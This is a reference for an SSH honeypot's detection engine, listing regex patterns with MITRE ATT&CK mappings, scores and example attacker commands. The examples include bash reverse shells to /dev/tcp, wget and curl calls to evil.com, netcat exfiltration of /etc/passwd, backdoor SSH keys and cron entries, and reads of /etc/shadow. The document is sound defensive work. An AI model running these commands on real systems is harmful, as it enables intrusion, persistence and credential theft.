# Threat Patterns Reference — SSH Honeypot

All 70+ detection patterns with MITRE ATT&CK mappings, severity levels, and example commands.

---

## How Threat Scoring Works

### Algorithm
```
1. Each command is scanned against ALL 70+ regex patterns
2. Each match adds base_score points to the session
3. Composite score = Σ(match_scores × category_weight) / max_possible_score × 100
4. Score range: 0–100
5. Score > 70 → High Priority Alert pushed to dashboard SSE stream
```

### Category Weights
| Category | Weight | Description |
|----------|--------|-------------|
| PERSISTENCE | 1.5× | Highest impact — attacker trying to stay |
| EXFIL | 1.5× | High impact — data leaving the system |
| MALWARE | 1.4× | Critical — malicious software |
| PRIVESC | 1.3× | High — privilege escalation |
| LATERAL | 1.2× | High — spreading to other systems |
| CRED_HUNT | 1.1× | Medium — credential theft |
| RECON | 1.0× | Low — information gathering |

### Score Thresholds
| Score Range | Classification | Action |
|-------------|---------------|--------|
| 0–20 | Low risk | Log only |
| 21–50 | Medium risk | Log + DB |
| 51–70 | High risk | Log + DB + Alert |
| 71–100 | Critical | Log + DB + Alert + SSE push |

---

## RECON — Reconnaissance (15 patterns)

*MITRE Tactic: TA0007 Discovery*

| Pattern | MITRE ID | Description | Score | Example Command |
|---------|----------|-------------|-------|-----------------|
| `uname\s+-` | T1082 | OS version discovery | 10 | `uname -a` |
| `cat\s+/etc/os-release` | T1082 | OS release read | 10 | `cat /etc/os-release` |
| `cat\s+/proc/version` | T1082 | Kernel version read | 10 | `cat /proc/version` |
| `cat\s+/proc/cpuinfo` | T1082 | CPU info read | 8 | `cat /proc/cpuinfo` |
| `cat\s+/proc/meminfo` | T1082 | Memory info read | 8 | `cat /proc/meminfo` |
| `cat\s+/etc/passwd` | T1087 | User enumeration | 22 | `cat /etc/passwd` |
| `cat\s+/etc/hosts` | T1016 | Hosts file read | 12 | `cat /etc/hosts` |
| `cat\s+/var/log/auth` | T1083 | Auth log read | 20 | `cat /var/log/auth.log` |
| `\bnetstat\b` | T1049 | Network connection enum | 15 | `netstat -an` |
| `\bss\s+-` | T1049 | Socket statistics enum | 15 | `ss -tlnp` |
| `\bps\s+(aux\|ef\|-e)\b` | T1057 | Process enumeration | 15 | `ps aux` |
| `\benv\b\|\bprintenv\b` | T1083 | Environment dump | 10 | `env` |
| `find\s+/\s+-` | T1083 | Filesystem enumeration | 20 | `find / -name "*.conf"` |
| `\blast\b` | T1033 | User session enum | 15 | `last` |
| `ip\s+(addr\|a\b\|route)` | T1016 | Network interface enum | 15 | `ip addr` |

**Severity: Low** — Indicates early-stage reconnaissance; attacker mapping the system.

---

## LATERAL — Lateral Movement (9 patterns)

*MITRE Tactic: TA0008 Lateral Movement*

| Pattern | MITRE ID | Description | Score | Example Command |
|---------|----------|-------------|-------|-----------------|
| `ssh\s+-i` | T1021.004 | SSH with identity key | 30 | `ssh -i id_rsa user@host` |
| `ssh\s+.*@` | T1021.004 | SSH connection attempt | 25 | `ssh user@192.168.1.5` |
| `scp\s+` | T1560 | File transfer via SCP | 25 | `scp file.txt user@host:/` |
| `cat\s+.*authorized_keys` | T1098 | SSH key harvesting | 35 | `cat ~/.ssh/authorized_keys` |
| `cat\s+.*id_rsa` | T1552.004 | Private key theft | 40 | `cat /root/.ssh/id_rsa` |
| `cat\s+.*known_hosts` | T1021.004 | Known hosts enumeration | 20 | `cat ~/.ssh/known_hosts` |
| `ssh-keygen` | T1098 | SSH key generation | 30 | `ssh-keygen -t rsa` |
| `echo.*authorized_keys` | T1098 | Backdoor SSH key | 40 | `echo "ssh-rsa..." >> authorized_keys` |
| `rsync\s+` | T1560 | rsync data transfer | 25 | `rsync -av /data user@host:/` |

**Severity: High** — Attacker attempting to spread to other systems.

---

## EXFIL — Data Exfiltration (8 patterns)

*MITRE Tactic: TA0010 Exfiltration*

| Pattern | MITRE ID | Description | Score | Example Command |
|---------|----------|-------------|-------|-----------------|
| `wget\s+http` | T1048 | File download attempt | 30 | `wget http://evil.com/shell.sh` |
| `curl\s+http` | T1041 | HTTP data transfer | 25 | `curl http://evil.com` |
| `\bbase64\b` | T1048 | Data encoding | 20 | `cat /etc/passwd \| base64` |
| `tar\s+.*[czf]` | T1560 | Archive creation | 20 | `tar czf data.tar.gz /home` |
| `gzip` | T1560 | Compression | 15 | `gzip -c file > file.gz` |
| `\bnc\s+-` | T1041 | Netcat data transfer | 35 | `nc 1.2.3.4 4444 < /etc/passwd` |
| `>\s*/tmp/` | T1048 | Writing to /tmp | 15 | `cat /etc/passwd > /tmp/out` |
| `python.*socket` | T1041 | Python socket exfil | 30 | `python3 -c "import socket..."` |

**Severity: Critical** — Active data exfiltration attempt.

---

## PERSISTENCE — Persistence Mechanisms (10 patterns)

*MITRE Tactic: TA0003 Persistence*

| Pattern | MITRE ID | Description | Score | Example Command |
|---------|----------|-------------|-------|-----------------|
| `crontab\s+` | T1053.003 | Cron job creation | 40 | `crontab -e` |
| `echo.*cron` | T1053.003 | Cron entry addition | 40 | `echo "* * * * * bash" >> /etc/cron.d/evil` |
| `useradd\s+` | T1136 | New user creation | 35 | `useradd -m backdoor` |
| `chpasswd` | T1136 | Password change | 30 | `echo "user:pass" \| chpasswd` |
| `echo.*authorized_keys` | T1098 | SSH backdoor key | 40 | `echo "key" >> ~/.ssh/authorized_keys` |
| `systemctl.*enable` | T1543.002 | Service persistence | 35 | `systemctl enable evil.service` |
| `chmod\s+\+x.*init` | T1543 | Init script persist | 35 | `chmod +x /etc/init.d/evil` |
| `/etc/profile` | T1546.004 | Profile modification | 30 | `echo "evil" >> /etc/profile` |
| `~/.bashrc` | T1546.004 | Bashrc modification | 25 | `echo "curl evil \| bash" >> ~/.bashrc` |
| `mkfifo\s+` | T1059 | Named pipe (backdoor) | 35 | `mkfifo /tmp/pipe` |

**Severity: Critical** — Attacker trying to maintain access after disconnect.

---

## PRIVESC — Privilege Escalation (12 patterns)

*MITRE Tactic: TA0004 Privilege Escalation*

| Pattern | MITRE ID | Description | Score | Example Command |
|---------|----------|-------------|-------|-----------------|
| `\bsu\b` | T1548 | Switch to root | 20 | `su`, `su root` |
| `\bsudo\b` | T1548.003 | Sudo execution | 25 | `sudo id` |
| `chmod\s+[0-9]*7` | T1166 | World-writable chmod | 25 | `chmod 777 /etc/passwd` |
| `chmod\s+4[0-9][0-9][0-9]` | T1548.001 | SUID bit set | 35 | `chmod 4755 /bin/bash` |
| `chown\s+root` | T1548 | Change owner to root | 30 | `chown root file` |
| `find.*-perm.*[s47]` | T1548.001 | SUID binary search | 25 | `find / -perm -4000` |
| `\bpkexec\b` | T1548 | Polkit exploit | 40 | `pkexec /bin/bash` |
| `CVE-\d{4}` | T1548 | Explicit CVE exploit | 40 | `./CVE-2021-4034` |
| `\bnmap\b` | T1046 | Network scanner | 25 | `nmap -sV 192.168.1.0/24` |
| `\bmasscan\b` | T1046 | Mass scanner | 30 | `masscan -p80 10.0.0.0/8` |
| `\bhydra\b` | T1110 | Brute force tool | 35 | `hydra -l root -P /tmp/pass ssh` |
| `setuid\|setcap` | T1548 | Capability setting | 30 | `setcap cap_setuid+ep /bin/python` |

**Severity: High** — Attacker attempting to gain root access.

---

## CRED_HUNT — Credential Hunting (8 patterns)

*MITRE Tactic: TA0006 Credential Access*

| Pattern | MITRE ID | Description | Score | Example Command |
|---------|----------|-------------|-------|-----------------|
| `cat\s+/etc/shadow` | T1552.001 | Shadow file read | 40 | `cat /etc/shadow` |
| `secret` | T1552 | Secret file access | 20 | `cat secret.txt` |
| `password` | T1552 | Password file search | 15 | `grep password config.yaml` |
| `api.?key` | T1552 | API key search | 20 | `grep -r api_key /home` |
| `\.ssh/` | T1552.004 | SSH key directory | 25 | `ls ~/.ssh/` |
| `\.env` | T1552 | Environment file | 20 | `cat .env` |
| `config\.ya?ml` | T1552 | Config file read | 15 | `cat config.yaml` |
| `grep.*pass.*[rf]` | T1552 | Password grep search | 25 | `grep -r password /home` |

**Severity: Medium** — Attacker hunting for credentials to use or exfiltrate.

---

## MALWARE — Malware & Mining (8 patterns)

*MITRE Tactic: TA0040 Impact, TA0011 C2*

| Pattern | MITRE ID | Description | Score | Example Command |
|---------|----------|-------------|-------|-----------------|
| `\bxmrig\b` | T1496 | XMRig crypto miner | 45 | `./xmrig --pool mining.pool.com` |
| `\bminerd\b` | T1496 | Generic miner | 40 | `./minerd -a cryptonight` |
| `stratum+tcp` | T1496 | Mining pool URL | 40 | `./miner -o stratum+tcp://...` |
| `\bnmap\b` | T1046 | Port scanner | 25 | `nmap -sS 10.0.0.0/24` |
| `\bmasscan\b` | T1046 | Mass scanner | 30 | `masscan -p1-65535 10.0.0.0/8` |
| `bash\s+-i.*tcp` | T1059.004 | Bash reverse shell | 50 | `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` |
| `/dev/tcp/` | T1059.004 | TCP reverse shell | 50 | `exec 3<>/dev/tcp/evil.com/443` |
| `python.*socket.*connect` | T1059.006 | Python reverse shell | 45 | `python3 -c "import socket..."` |

**Severity: Critical** — Active malware deployment or C2 communication.

---

## Pattern Examples in Practice

### Low Score Session (Casual Exploration)
```
whoami          → 0 pts (no match)
ls              → 0 pts
cat /etc/passwd → 22 pts (RECON/T1087)
netstat -an     → 15 pts (RECON/T1049)
env             → 10 pts (RECON/T1083)
Total score: ~47/100 → MEDIUM RISK
```

### High Score Session (Active Attack)
```
cat /etc/shadow → 40 pts (CRED_HUNT/T1552)
sudo id         → 25 pts (PRIVESC/T1548)
wget http://... → 30 pts (EXFIL/T1048)
bash -i >& /dev/tcp/... → 50 pts (MALWARE/T1059)
Total score: ~85/100 → CRITICAL + SSE Alert fired
```

---

## Adding New Patterns

Add to the `_RAW` list in `core/threat_engine.py`:

```python
_RAW = [
    # Existing patterns...
    
    # NEW PATTERN FORMAT:
    # (regex_string, category, base_score, mitre_id, description)
    (r"your_regex_here", "CATEGORY", score_1_to_50, "T1234", "Description"),
]
```

**Example — Adding Docker escape detection:**
```python
(r"docker\s+run.*--privileged", "PRIVESC", 45, "T1611", "Docker privileged container escape"),
(r"/var/run/docker\.sock", "LATERAL", 35, "T1552", "Docker socket access"),
```

**Guidelines:**
- Score 5–15: Low risk, common patterns
- Score 16–25: Medium risk, suspicious behavior  
- Score 26–40: High risk, active attack indicator
- Score 41–50: Critical, immediate threat
